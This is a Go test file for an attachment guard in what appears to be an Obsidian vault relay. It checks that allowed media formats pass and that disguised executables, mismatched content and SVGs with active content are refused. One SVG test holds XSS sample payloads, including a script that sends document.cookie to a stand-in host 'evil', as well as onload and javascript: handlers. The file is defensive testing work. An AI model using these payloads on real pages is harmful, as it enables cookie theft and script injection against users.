package relay

import (
	"strings"
	"testing"
)

var png = []byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x01}

func TestAllowsTheFormatsObsidianRenders(t *testing.T) {
	for _, c := range []struct {
		path string
		body []byte
	}{
		{"att/a.png", png},
		{"att/a.jpg", []byte{0xff, 0xd8, 0xff, 0xe0}},
		{"att/a.pdf", []byte("%PDF-1.7\n")},
		{"att/a.gif", []byte("GIF89a....")},
		{"att/a.mp3", []byte("ID3\x03\x00")},
		{"att/a.mp4", []byte("\x00\x00\x00\x18ftypmp42")},
		{"att/a.svg", []byte(`<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>`)},
	} {
		if err := guardAttachment(c.path, c.body); err != nil {
			t.Errorf("%s was refused: %v", c.path, err)
		}
	}
}

func TestRefusesAnExecutableWhateverItIsCalled(t *testing.T) {
	// The trick the extension list alone would miss.
	elf := []byte{0x7f, 'E', 'L', 'F', 0x02, 0x01}
	for _, name := range []string{"att/payload.png", "att/payload.pdf", "att/payload.mp4"} {
		err := guardAttachment(name, elf)
		if err == nil {
			t.Fatalf("%s carrying ELF bytes was accepted", name)
		}
		if !strings.Contains(err.Error(), "ELF") {
			t.Errorf("the refusal does not say what the content actually is: %v", err)
		}
	}
}

func TestRefusesEveryExecutableSignature(t *testing.T) {
	for _, body := range [][]byte{
		{'M', 'Z', 0x90, 0x00},
		{0xfe, 0xed, 0xfa, 0xcf},
		{0xca, 0xfe, 0xba, 0xbe},
		[]byte("#!/bin/sh\necho hi\n"),
		{0x00, 0x61, 0x73, 0x6d},
	} {
		if err := guardAttachment("att/x.png", body); err == nil {
			t.Errorf("executable-shaped content %v was accepted", body[:4])
		}
	}
}

func TestRefusesATypeTheVaultDoesNotHold(t *testing.T) {
	err := guardAttachment("att/thing.exe", []byte("harmless"))
	if err == nil {
		t.Fatal(".exe was accepted")
	}
	// The message has to say what IS allowed, or the caller can only guess.
	if !strings.Contains(err.Error(), "png") {
		t.Errorf("the refusal does not list the allowed types: %v", err)
	}
}

func TestTextBelongsInWriteNote(t *testing.T) {
	err := guardAttachment("notes/idea.md", []byte("# hello"))
	if err == nil || !strings.Contains(err.Error(), "write_note") {
		t.Errorf("a .md through write_attachment should point at write_note: %v", err)
	}
}

func TestRefusesContentThatDoesNotMatchItsExtension(t *testing.T) {
	// Not executable, not disallowed by type — just a lie about what it is.
	err := guardAttachment("att/photo.png", []byte("%PDF-1.7\n"))
	if err == nil {
		t.Fatal("a PDF named .png was accepted")
	}
	if !strings.Contains(err.Error(), "does not look like") {
		t.Errorf("unexpected refusal: %v", err)
	}
}

func TestRefusesAnSvgCarryingActiveContent(t *testing.T) {
	// Obsidian renders SVG where the note is displayed, so a script in one runs
	// there. This is the difference between an image format and a delivery
	// mechanism.
	for _, body := range []string{
		`<svg><script>fetch("http://evil/"+document.cookie)</script></svg>`,
		`<svg><image onload="alert(1)"/></svg>`,
		`<svg><a href="javascript:alert(1)">x</a></svg>`,
		`<svg><foreignObject><iframe src="http://evil"/></foreignObject></svg>`,
	} {
		if err := guardAttachment("att/x.svg", []byte(body)); err == nil {
			t.Errorf("active SVG accepted: %s", body)
		}
	}
}

func TestRefusesAPathWithNoExtension(t *testing.T) {
	if err := guardAttachment("att/mystery", png); err == nil {
		t.Error("an extensionless attachment was accepted")
	}
}

func TestAnEmptyBodyCannotPassAPinnedType(t *testing.T) {
	// Guards the offset arithmetic: an empty or truncated body must not slip
	// through the magic check by being too short to compare.
	if err := guardAttachment("att/a.png", nil); err == nil {
		t.Error("an empty .png was accepted")
	}
	if err := guardAttachment("att/a.mp4", []byte{0x00, 0x01}); err == nil {
		t.Error("a truncated .mp4 was accepted")
	}
}
